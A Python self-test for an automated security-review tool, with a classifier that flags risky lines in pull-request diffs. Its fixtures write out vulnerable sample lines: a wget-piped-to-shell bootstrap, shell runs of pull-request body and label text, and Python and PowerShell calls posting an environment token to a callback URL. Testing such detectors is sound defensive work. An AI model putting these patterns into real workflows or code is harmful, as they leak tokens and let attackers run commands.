#!/usr/bin/env python3
"""Regression self-test for DCOIR Review v12 runtime patch.

The test uses narrow stubs so it can run in connector staging without importing
the large reviewer. It exercises the #336 failure shape: an invalid selected
untrusted-checkout finding must be replaced by a deterministic fallback, the
postable list must refill to the inline budget, Python path-write sentinels must
be accounted for, and Python env-token/SSRF accounting must coalesce.
"""

from __future__ import annotations

import importlib.util
import re
import sys
import types
from pathlib import Path
from types import SimpleNamespace
from typing import Any


WORKFLOW = ".github/workflows/dcoir-review-v12-balanced-detection-probe.yml"
PYTHON = ".github/chatgpt_staging/dcoir_review_probe/v12_probe_python.py"
POWERSHELL = ".github/chatgpt_staging/dcoir_review_probe/v12_probe_powershell.ps1"
K8S = ".github/chatgpt_staging/dcoir_review_probe/v12_optional_k8s.yml"


def _install_stubs() -> None:
    v4 = types.ModuleType("dcoir_review_required_runtime_patch_v4")
    v4.YAML_PULL_REQUEST_TARGET = "yaml_pull_request_target"
    v4.YAML_BROAD_WRITE = "yaml_broad_write"
    v4.YAML_UNTRUSTED_CHECKOUT = "yaml_untrusted_checkout"
    v4.YAML_SHELL_PIPE = "yaml_shell_pipe"
    v4.YAML_METADATA_SHELL = "yaml_metadata_shell"
    v4.PS_ACL = "ps_acl"
    v4.PS_PROCESS_LAUNCH = "ps_process_launch"
    v4.PYTHON_SSRF = "python_ssrf"
    sys.modules[v4.__name__] = v4

    v5 = types.ModuleType("dcoir_review_required_runtime_patch_v5")
    v5.PYTHON_YAML_LOAD = "python_yaml_load"
    v5.PYTHON_SHELL_EXEC = "python_shell_exec"
    v5.PYTHON_ENV_TOKEN = "python_env_token_callback"
    v5.PS_ENV_TOKEN = "ps_env_token_callback"

    def normalize(value: Any) -> str:
        return re.sub(r"\s+", " ", str(value or "").strip().lower())

    v5._normalize = normalize
    v5._normalize_comment_finding = lambda finding: dict(finding)
    sys.modules[v5.__name__] = v5

    core = types.ModuleType("dcoir_review_required_runtime_patch_v9_core")
    core.SELECTION_SUMMARY = {}
    core._line_number = lambda value: int(value or 0)
    core._severity_rank = lambda finding: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(
        str(finding.get("severity", "")).lower(), 4
    )
    core._confidence = lambda finding: float(finding.get("confidence", 0) or 0)
    sys.modules[core.__name__] = core

    v9 = types.ModuleType("dcoir_review_required_runtime_patch_v9")
    v9.PYTHON_PICKLE_LOAD = "python_pickle_load"
    v9.PS_DYNAMIC_EXEC = "ps_dynamic_exec"
    v9._ensure_prompt_review = lambda _config: None
    sys.modules[v9.__name__] = v9

    selection = types.ModuleType("dcoir_review_required_runtime_patch_v9_selection")

    def iter_added_diff_lines(diff: str) -> list[tuple[str, int, str]]:
        result: list[tuple[str, int, str]] = []
        path = ""
        line_no = 0
        for raw in diff.splitlines():
            if raw.startswith("+++ b/"):
                path = raw[6:]
            elif raw.startswith("@@"):
                match = re.search(r"\+(\d+)", raw)
                line_no = int(match.group(1)) if match else 0
            elif path and line_no:
                if raw.startswith("+") and not raw.startswith("+++"):
                    result.append((path, line_no, raw[1:]))
                    line_no += 1
                elif raw.startswith(" ") or raw == "":
                    line_no += 1
        return result

    selection._iter_added_diff_lines = iter_added_diff_lines
    sys.modules[selection.__name__] = selection

    v10 = types.ModuleType("dcoir_review_required_runtime_patch_v10")
    v10.YAML_TOKEN_TO_PR_URL = "yaml_token_to_pr_body_url"
    v10._validation_for_token_to_pr_url = lambda path: f"validate-token-url {path}"
    v10._scrub_shell_pipe_wording = lambda _finding: None
    sys.modules[v10.__name__] = v10

    v11 = types.ModuleType("dcoir_review_required_runtime_patch_v11")
    v11.PYTHON_ARCHIVE_EXTRACT = "python_archive_extract"
    v11.PYTHON_PATH_WRITE = "python_path_write"
    v11.K8S_HOST_NETWORK = "k8s_host_network"
    v11.K8S_PRIVILEGED_CONTAINER = "k8s_privileged_container"
    v11.K8S_PRIVILEGE_ESCALATION = "k8s_privilege_escalation"
    v11.K8S_HOST_PATH = "k8s_host_path"
    v11._normalize = normalize
    v11._canonical_kind = lambda kind: kind
    v11._base_sentinel_key = lambda sentinel: (
        str(getattr(sentinel, "path", "") or ""),
        int(getattr(sentinel, "line", 0) or 0),
        "",
    )

    def line_kind(path: str, text: str) -> str:
        lower = normalize(text)
        suffix = Path(path.lower()).suffix
        if suffix in {".yml", ".yaml"}:
            if "github_token" in lower and "pull_request.body" in lower:
                return v10.YAML_TOKEN_TO_PR_URL
            if "pull_request_target" in lower:
                return v4.YAML_PULL_REQUEST_TARGET
            if ": write" in lower or "write-all" in lower:
                return v4.YAML_BROAD_WRITE
            if "pull_request.head" in lower or "github.head_ref" in lower:
                return v4.YAML_UNTRUSTED_CHECKOUT
            if ("curl" in lower or "wget" in lower) and ("| sh" in lower or "| bash" in lower):
                return v4.YAML_SHELL_PIPE
            if "github.event.pull_request" in lower and ("bash" in lower or "sh -c" in lower):
                return v4.YAML_METADATA_SHELL
        if suffix == ".py":
            if "pickle.load" in lower:
                return v9.PYTHON_PICKLE_LOAD
            if "yaml.load" in lower:
                return v5.PYTHON_YAML_LOAD
            if "shell=true" in lower:
                return v5.PYTHON_SHELL_EXEC
            if "requests.post" in lower and "callback" in lower:
                return v5.PYTHON_ENV_TOKEN
            if "extractall" in lower:
                return v11.PYTHON_ARCHIVE_EXTRACT
            if ".open(" in lower and "write" in lower:
                return v11.PYTHON_PATH_WRITE
        if suffix == ".ps1":
            if "invoke-expression" in lower:
                return v9.PS_DYNAMIC_EXEC
            if "filesystemaccessrule" in lower or "set-acl" in lower:
                return v4.PS_ACL
            if "start-process" in lower:
                return v4.PS_PROCESS_LAUNCH
            if "invoke-webrequest" in lower and "authorization" in lower:
                return v5.PS_ENV_TOKEN
        if suffix in {".yml", ".yaml"} and "hostnetwork" in lower:
            return v11.K8S_HOST_NETWORK
        return ""

    v11._line_kind = line_kind
    v11._base_required_sentinels = lambda _hardened, risk_sentinels: list(risk_sentinels)
    v11._text_kinds = lambda path, text: {line_kind(path, text)} - {""}
    v11._explicit_kind = lambda finding: (
        str(finding.get("_risk_sentinel_key", ["", 0, ""])[2])
        if isinstance(finding.get("_risk_sentinel_key"), (list, tuple))
        else str(finding.get("_risk_sentinel_kind", "") or "")
    )
    v11._title_kinds = lambda finding: {line_kind(str(finding.get("path", "") or ""), str(finding.get("title", "") or ""))} - {""}

    def postable_key(finding: dict[str, Any]) -> tuple[str, int, str]:
        explicit = finding.get("_risk_sentinel_key")
        if isinstance(explicit, (list, tuple)) and len(explicit) == 3:
            return str(explicit[0]), int(explicit[1]), str(explicit[2])
        return (
            str(finding.get("path", "") or ""),
            int(finding.get("line", 0) or 0),
            line_kind(str(finding.get("path", "") or ""), str(finding.get("_anchored_line_text", "") or ""))
            or line_kind(str(finding.get("path", "") or ""), str(finding.get("title", "") or "")),
        )

    v11._postable_key = postable_key
    v11._fallback_for_sentinel = lambda _hardened, sentinel, _config: {
        "title": str(getattr(sentinel, "label", "") or line_kind(str(getattr(sentinel, "path", "") or ""), str(getattr(sentinel, "text", "") or ""))),
        "severity": "high",
        "confidence": 0.99,
        "path": str(getattr(sentinel, "path", "") or ""),
        "line": int(getattr(sentinel, "line", 0) or 0),
        "body": str(getattr(sentinel, "detail", "") or "fallback"),
        "_anchored_line_text": str(getattr(sentinel, "text", "") or ""),
    }
    v11._validation_for_key = lambda kind, path, line=0: f"validate {kind} {path}:{line}"
    v11._patch_progress_comment = lambda *_args, **_kwargs: None
    sys.modules[v11.__name__] = v11


def _load_v12():
    _install_stubs()
    path = Path(__file__).with_name("dcoir_review_required_runtime_patch_v12.py")
    spec = importlib.util.spec_from_file_location("dcoir_review_required_runtime_patch_v12", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def sentinel(path: str, line: int, text: str, label: str = "", detail: str = "") -> SimpleNamespace:
    return SimpleNamespace(path=path, line=line, text=text, label=label, detail=detail)


def risk_sentinels() -> list[SimpleNamespace]:
    return [
        sentinel(WORKFLOW, 3, "  pull_request_target:"),
        sentinel(WORKFLOW, 5, "  contents: write"),
        sentinel(WORKFLOW, 6, "  checks: write"),
        sentinel(WORKFLOW, 13, "          ref: ${{ github.event.pull_request.head.sha }}"),
        sentinel(WORKFLOW, 15, "        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | sh"),
        sentinel(WORKFLOW, 17, '        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"'),
        sentinel(WORKFLOW, 19, '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"'),
        sentinel(WORKFLOW, 21, '        run: sh -c "${{ github.event.pull_request.body }}"'),
        sentinel(PYTHON, 12, "    return pickle.load(raw)"),
        sentinel(PYTHON, 16, "    return yaml.load(text, Loader=yaml.Loader)"),
        sentinel(PYTHON, 20, "    return subprocess.check_output(command_text, shell=True)"),
        sentinel(PYTHON, 25, "    archive.extractall(destination)"),
        sentinel(PYTHON, 29, '    token = os.environ["DCOIR_TOKEN"]', "environment dump or exfiltration primitive", "DCOIR_TOKEN env read"),
        sentinel(PYTHON, 30, '    return requests.post(callback, headers={"Authorization": f"Bearer {token}"})'),
        sentinel(PYTHON, 34, '    Path(user_path).open(mode="w+b").write(payload.encode())'),
        sentinel(POWERSHELL, 9, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")'),
        sentinel(POWERSHELL, 12, "Invoke-Expression $UserCommand"),
        sentinel(POWERSHELL, 13, "Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait"),
        sentinel(POWERSHELL, 15, 'Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $Token" }'),
        sentinel(K8S, 6, "  hostNetwork: true"),
    ]


class Config(SimpleNamespace):
    max_inline_comments: int = 12
    debug: bool = True


class FakeHardened:
    ReviewQualityError = RuntimeError

    def __init__(self) -> None:
        self.debug: dict[str, object] = {}

    def write_debug_json_artifact_safely(self, _config, path, data):
        self.debug[path] = data


def test_backfill_and_ledger() -> None:
    v12 = _load_v12()
    bad_checkout_finding = {
        "path": WORKFLOW,
        "line": 13,
        "title": "Privileged pull_request_target workflow context",
        "body": "This is a contextual trigger finding, not the checkout sink.",
        "_anchored_line_text": "          ref: ${{ github.event.pull_request.head.sha }}",
        "_risk_sentinel_key": [WORKFLOW, 13, "yaml_untrusted_checkout"],
    }
    result = v12._select_required_postable(FakeHardened(), [bad_checkout_finding], risk_sentinels(), Config())
    metadata = sys.modules["dcoir_review_required_runtime_patch_v9_core"].SELECTION_SUMMARY
    selected = set(metadata["selected_keys"])
    omitted = {(item["path"], item["line"], item["kind"]) for item in metadata["omitted_required_sentinels"]}

    assert len(result) == 12
    assert metadata["final_postable_count"] == 12
    assert metadata["final_invalid_selected_keys"] == []
    assert f"{WORKFLOW}:13 yaml_untrusted_checkout" in selected
    assert not any(key.endswith(" ") for key in selected)
    assert metadata["required_ledger_accounted_count"] == metadata["coalesced_required_count"]
    assert any(key.endswith(" python_path_write") for key in selected) or (PYTHON, 34, "python_path_write") in omitted
    assert not any(key.endswith(" python_ssrf") and f"{PYTHON}:30" in key for key in metadata["final_uncovered"])


def test_validation_delegation_after_core_patch() -> None:
    v12 = _load_v12()
    v12._patch_core_semantics()
    assert v12._validation_for_key("python_pickle_load", PYTHON, 12) == f"validate python_pickle_load {PYTHON}:12"


def test_env_token_canonicalization_is_not_file_wide() -> None:
    v12 = _load_v12()
    assert (
        v12._canonical_kind(
            "python_ssrf",
            'return requests.post(callback, headers={"Authorization": f"Bearer {token}"})',
            "",
        )
        == "python_env_token_callback"
    )
    assert v12._canonical_kind("python_ssrf", "return requests.get(callback)", "") == "python_ssrf"
    assert v12._coverage_key((PYTHON, 30, "python_env_token_callback")) != v12._coverage_key(
        (PYTHON, 40, "python_env_token_callback")
    )


def test_python_path_write_sentinel_insertion() -> None:
    v12 = _load_v12()

    class Owner:
        RiskSentinel = SimpleNamespace

        @staticmethod
        def detect_risk_sentinels(_diff, *_args, **_kwargs):
            return []

    diff = "\n".join(
        [
            "diff --git a/x.py b/x.py",
            f"+++ b/{PYTHON}",
            "@@ -31,0 +34,1 @@",
            '+    Path(user_path).open(mode="w+b").write(payload.encode())',
        ]
    )
    owner = Owner()
    v12._patch_python_extra_sentinels(owner)
    found = owner.detect_risk_sentinels(diff)
    assert [(item.path, item.line, item.label) for item in found] == [
        (PYTHON, 34, "Python request-controlled file write")
    ]


def test_python_path_write_sentinel_skips_test_files() -> None:
    v12 = _load_v12()

    class Owner:
        RiskSentinel = SimpleNamespace

        @staticmethod
        def detect_risk_sentinels(_diff, *_args, **_kwargs):
            return []

    test_path = "project_sources/collector/tools/test_safe_file_write.py"
    diff = "\n".join(
        [
            "diff --git a/x.py b/x.py",
            f"+++ b/{test_path}",
            "@@ -31,0 +34,1 @@",
            '+    Path(output_path).open(mode="w+b").write(payload.encode())',
        ]
    )
    owner = Owner()
    v12._patch_python_extra_sentinels(owner)
    found = owner.detect_risk_sentinels(diff)
    assert found == []


def main() -> None:
    test_backfill_and_ledger()
    test_validation_delegation_after_core_patch()
    test_env_token_canonicalization_is_not_file_wide()
    test_python_path_write_sentinel_insertion()
    test_python_path_write_sentinel_skips_test_files()
    print("dcoir_review_required_runtime_patch_v12_selftest passed")


if __name__ == "__main__":
    main()
